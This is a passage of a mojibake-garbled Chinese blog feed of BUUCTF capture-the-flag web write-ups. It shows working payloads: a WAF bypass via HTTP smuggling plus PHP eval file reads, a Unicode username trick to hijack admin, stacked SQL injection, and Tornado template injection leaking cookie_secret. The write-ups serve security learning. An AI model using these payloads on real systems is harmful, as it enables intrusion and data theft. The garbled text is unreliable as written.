punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>æœ‰ä¸€ä¸ª<code>calc.php</code>,è·Ÿè¿›å»çœ‹çœ‹<br>å‘ç°wafä»£ç </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>wafè¿‡æ»¤äº†â€™ â€˜,â€™\tâ€™,â€™\râ€™,â€™\nâ€™,â€™'â€˜,â€™â€â€˜,â€™`â€™,â€™[â€˜,â€™]â€™,â€™$â€™,â€™'<br>å…¶ä¸­ä»¥getæ–¹å¼ç»™numä¼ å‚</p><p>ç”±äºå‰ç«¯è®¾ç½®äº†wafï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬çš„è®¿é—®è¯·æ±‚ä¸­åŒ…å«éæ³•å­—ç¬¦å°±ä¼šè¿”å›403ï¼Œæ— æ³•è®¿é—®åˆ°åç«¯<br>åœ¨è¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨HTTPèµ°ç§æ¥ç»•è¿‡å‰ç«¯wafç›´æ¥è®¿é—®åç«¯</p><p>å…³äºHTTPèµ°ç§çš„ä»‹ç»ç½‘ä¸Šæœ‰è®¸å¤šå¸ˆå‚…åšäº†è®²è§£ï¼Œåœ¨è¿™é‡Œå°±ä¸å¤šå™è¿°äº†<br>(HTTPèµ°ç§)[<a href="https://xz.aliyun.com/t/6654]" target="_blank" rel="noopener">https://xz.aliyun.com/t/6654]</a><br>(httpè¯·æ±‚èµ°ç§(HTTP Request Smuggling))[<a href="https://blog.csdn.net/qq_37865996/article/details/102529396]" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/article/details/102529396]</a><br>è´´ä¸¤ä¸ªé“¾æ¥</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨CL-CLæ–¹å¼æ¥è¿›è¡Œhttpèµ°ç§ï¼Œå½“ç„¶å…¶ä»–çš„æ–¹å¼ä¹Ÿä¸€æ ·å¯ä»¥<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/2.jpg" alt=""><br>å‰ç«¯æœåŠ¡å™¨è¯»å–å®Œnum=1ä¹‹åï¼Œå°†æ•°æ®åŒ…åŸå°ä¸åŠ¨åœ°è½¬å‘ç»™åç«¯ï¼Œåç«¯è¯»å–åˆ°<code>?num=phpinfo()</code>åï¼Œè¿”å›ç»™æˆ‘ä»¬<code>phpinfo()</code><br>åœ¨è¿™ä¸€é¢˜é‡Œæœ‰å‡ ä¸ªPHPå‡½æ•°éœ€è¦æˆ‘ä»¬æ³¨æ„</p><pre class=" language-bash"><code class="language-bash">scandir<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span>å‡½æ•°ï¼švar_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å›falseã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚</code></pre><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>scandir("\")</code>æ¥æ‰«ææ ¹ç›®å½•ï¼Œä½†â€â€è¢«ç¦äº†ï¼Œæ‰€ä»¥è¿™æ ·å­ä¸è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ\è½¬ä¸ºASCIIç ï¼Œç„¶åå†è½¬ä¸ºå­—ç¬¦ï¼Œ</p><pre class=" language-bash"><code class="language-bash">chr<span class="token punctuation">(</span><span class="token punctuation">)</span>chr<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚</code></pre><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ æˆ<code>scandir(chr(47))</code>æ¥æ‰«ææ ¹ç›®å½•<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/3.jpg" alt=""><br>æ‰¾åˆ°äº†flagå­˜æ”¾çš„ç›®å½•<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä»f1aggç›®å½•ä¸­è¯»å–flag<br>æ„é€ payload</p><pre class=" language-bash"><code class="language-bash">?num<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>47<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>102<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>49<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>97<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code>å°±æ˜¯/f1agg<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/4.jpg" alt=""><br>flagåˆ°æ‰‹</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> httpèµ°ç§ </tag>
            
            <tag> PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF admin</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-admin/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-admin/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œæœ‰æ³¨å†Œå’Œç™»å½•ä¸¤ä¸ªåŠŸèƒ½<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/1.jpg" alt=""></p><a id="more"></a><p>æŸ¥çœ‹æºä»£ç ï¼Œçœ‹åˆ°æç¤º<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/2.jpg" alt=""><br>çŒœæµ‹éœ€è¦ä»¥adminè´¦å·ç™»é™†æ‰èƒ½æ‹¿åˆ°flag<br>é‚£ä¹ˆå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·çœ‹çœ‹(adminè´¦å·å·²è¢«æ³¨å†Œ)<br>æ³¨å†Œè´¦å·åä¸€å…±æœ‰å››ä¸ªé€‰é¡¹<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/3.jpg" alt=""><br>é¦–å…ˆçœ‹åˆ°poståŠŸèƒ½<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/4.jpg" alt=""><br>ä¸€ä¸ªç¼–è¾‘ç•™è¨€çš„åœ°æ–¹ï¼Œå¯èƒ½ä¼šæœ‰xssä¹‹ç±»çš„æ¼æ´ï¼Ÿæˆ‘ä¸å¤ªæ¸…æ¥šï¼Œå› ä¸ºæˆ‘ç›®å‰å¹¶ä¸ä¼šxss<br>å†çœ‹åˆ°change passwordåŠŸèƒ½ï¼ŒæŸ¥çœ‹æºä»£ç <br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/5.jpg" alt=""><br>ç»™å‡ºäº†æºä»£ç çš„GitHubåœ°å€<br>é‚£å°±è¿‡å»çœ‹çœ‹<br>åˆ†æroutes.py<br>è·¯ç”±çš„åŠŸèƒ½ä¸å¤šï¼Œæ³¨å†Œï¼Œç™»å½•ï¼Œç™»å‡ºï¼Œç¼–è¾‘å’Œä¿®æ”¹å¯†ç </p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre><p>ä»æ³¨å†Œå¼€å§‹åˆ†æ<br>æ³¨æ„åˆ°æ¥æ”¶usernameè¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ª<code>strlower</code>å‡½æ•°<br>çœ‹èµ·æ¥æ˜¯ä½¿å­—ç¬¦ä¸²å°å†™çš„å‡½æ•°ï¼Œä½†pythonå†…ç½®<code>lower()</code>å‡½æ•°ï¼Œä¸ºä»€ä¹ˆè¦è‡ªå·±å†™ä¸€ä¸ªå‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>äº‹å®ä¸Šï¼Œä¸æ­¢æ³¨å†Œè¿™é‡Œï¼Œç™»å½•å’Œä¿®æ”¹å¯†ç å¤„åŒæ ·ä½¿ç”¨äº†<code>strlower</code>å‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>é‚£æˆ‘ä»¬å°±å»çœ‹çœ‹è¿™ä¸ª<code>strlower</code>å‡½æ•°æ˜¯ä»€ä¹ˆæ ·çš„</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>è¿™é‡Œé¢ä½¿ç”¨äº†nodeprep.prepare()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯¹åº”çš„åº“æ˜¯twisted<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/7.jpg" alt=""><br>è¿™ä¹ˆä¸€å¯¹æ¯”ï¼Œå‘ç°æºç ä¸­ä½¿ç”¨çš„twistedåº“çš„ç‰ˆæœ¬å®åœ¨å¤ªä½äº†<br><a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">å‚è€ƒè¿™ç¯‡æ–‡ç« </a><br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±èƒ½å½¢æˆä¸€ä¸ªæ”»å‡»é“¾<br>ç™»é™†æ—¶ä¼šè°ƒç”¨ä¸€æ¬¡<code>strlower</code>ï¼Œä¿®æ”¹å¯†ç æ—¶åˆä¼šè°ƒç”¨ä¸€æ¬¡<code>strlower</code>ï¼Œåªè¦æˆ‘ä»¬çš„ç”¨æˆ·åç»è¿‡ä¸¤æ¬¡è°ƒç”¨åå˜æˆäº†adminï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ç„¶åé‡æ–°ç™»é™†äº†</p><pre class=" language-bash"><code class="language-bash">á´¬á´°á´¹á´µá´º -<span class="token operator">></span> ADMIN -<span class="token operator">></span> admin</code></pre><p>adminçš„Unicodeç¼–ç å¯ä»¥åœ¨ç½‘ä¸Šæ‰¾åˆ°<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/8.jpg" alt=""><br>æˆåŠŸæ‹¿åˆ°flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Unicodeæ¬ºéª— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF EasySQL</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/</url>
      
        <content type="html"><![CDATA[<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/1.jpg" alt=""></p><a id="more"></a><p>è¿™é¢˜å’Œå¼ºç½‘æ¯éšä¾¿æ³¨ä¸€æ ·ï¼Œéƒ½æ˜¯å †å æ³¨å…¥<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/3.jpg" alt=""><br>é€šè¿‡show tableså¯ä»¥çœ‹åˆ°Flagè¡¨<br>ä½†æƒ³è¦çœ‹åˆ°åˆ—å°±ä¸è¡Œäº†<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/4.jpg" alt=""><br>é€šè¿‡burpfuzzä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°è¿‡æ»¤äº†æŒºå¤šå…³é”®å­—çš„</p><hr><p>æœ‰ç‚¹éš¾é¡¶ï¼Œåªèƒ½çœ‹wpäº†</p><pre class=" language-sql"><code class="language-sql">å®˜æ–¹è§£:<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span></code></pre><p>è€Œè¿™é“é¢˜çš„sqlè¯­å¥æ˜¯è¿™æ ·çš„</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> $post<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>æ‹¼æ¥ä¸€ä¸‹å°±å˜æˆäº†è¿™æ ·</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>å…³äº sql_mode :<br>å®ƒå®šä¹‰äº† MySQL åº”æ”¯æŒçš„ SQL è¯­æ³•ï¼Œä»¥åŠåº”è¯¥åœ¨æ•°æ®ä¸Šæ‰§è¡Œä½•ç§ç¡®è®¤æ£€æŸ¥ï¼Œå…¶ä¸­çš„ PIPES_AS_CONCAT å°† || è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œé â€œæˆ–â€ è¿ç®—ç¬¦<br><a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode è¯´æ˜</a><br>æ‰€ä»¥ï¼Œå½“set sql_mode=pipes_as_concatæ‰§è¡Œåï¼Œä¼šæŠŠselect 1å’Œselect flagçš„ç»“æœæ‹¼æ¥èµ·æ¥<br>è€å®è¯´ï¼Œæˆ‘å®åœ¨æƒ³ä¸å‡ºæ¥è¿™é¢˜çš„sqlè¯­å¥ç«Ÿç„¶æ˜¯è¿™æ ·çš„<br>è¿˜æ˜¯æˆ‘å¤ªèœäº†<br>æ‰€ä»¥æˆ‘æ›´å€¾å‘äºéé¢„æœŸè§£</p><pre class=" language-bash"><code class="language-bash">*,1</code></pre><p>æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­å°±æ˜¯</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>è¿™æ ·å°±æ˜¯é€‰æ‹©æ‰€æœ‰ï¼Œä¸€æ ·èƒ½çˆ†flag</p><p>æ€»çš„æ¥è¯´ï¼Œæ— è®ºæ˜¯å®˜æ–¹è§£è¿˜æ˜¯éé¢„æœŸè§£ï¼Œæˆ‘éƒ½èƒ½ä»ä¸­å­¦åˆ°ä¸€äº›ä¸œè¥¿ï¼Œä¸€ä¸ªæ‰©å®½çŸ¥è¯†é¢ï¼Œä¸€ä¸ªå¼€é˜”æ€è·¯</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å †å æ³¨å…¥ </tag>
            
            <tag> mysql_sql_mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF easy_tornado</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/1.jpg" alt=""></p><a id="more"></a><p>æœ‰ä¸‰ä¸ªé¡µé¢ï¼ŒæŒ¨ä¸ªè®¿é—®çœ‹çœ‹</p><pre class=" language-bash"><code class="language-bash">/flag.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/2.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/welcome.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/3.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/hints.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/4.jpg" alt=""><br>å¼€å§‹åˆ†æ<br>ç¬¬ä¸€ä¸ªé¡µé¢å‘Šè¯‰æˆ‘ä»¬flag in /fllllllllllllag<br>hintå‘Šè¯‰æˆ‘ä»¬</p><pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>cookie_secret+md5<span class="token punctuation">(</span>filename<span class="token punctuation">))</span></code></pre><p>ä¹Ÿå°±æ˜¯filenameçš„md5å€¼åŠ ä¸Šcookie_secretå†md5<br>æˆ‘ä»¬æƒ³è¦è¿›å…¥åˆ°fllllllllllllagï¼Œfilenameå·²ç»çŸ¥é“äº†ï¼Œå‰©ä¸‹cookie_secretä¸çŸ¥é“<br>åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå‡ºç°è¿™æ ·ä¸€ä¸ªé¡µé¢</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span>Error</code></pre><p>é€šè¿‡ç™¾åº¦çŸ¥é“<br>tornadoæ˜¯pythonä¸­çš„ä¸€ä¸ªwebåº”ç”¨æ¡†æ¶<br>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚<br>å†åŠ ä¸Šerror?msg=Errorè¿™ä¸ªé¡µé¢<br>æ€€ç–‘å­˜åœ¨<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»(SSTI)</a><br>ç»è¿‡æµ‹è¯•ï¼Œç¡®å®å­˜åœ¨æ¨¡æ¿æ³¨å…¥<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/5.jpg" alt=""><br>ç„¶åé€šè¿‡æŸ¥é˜…å„ç§èµ„æ–™ï¼Œå‘ç°å¯¹äºtornadoæ¡†æ¶å­˜åœ¨é™„å±æ–‡ä»¶handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payloadä¸º</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler.settings<span class="token punctuation">}</span><span class="token 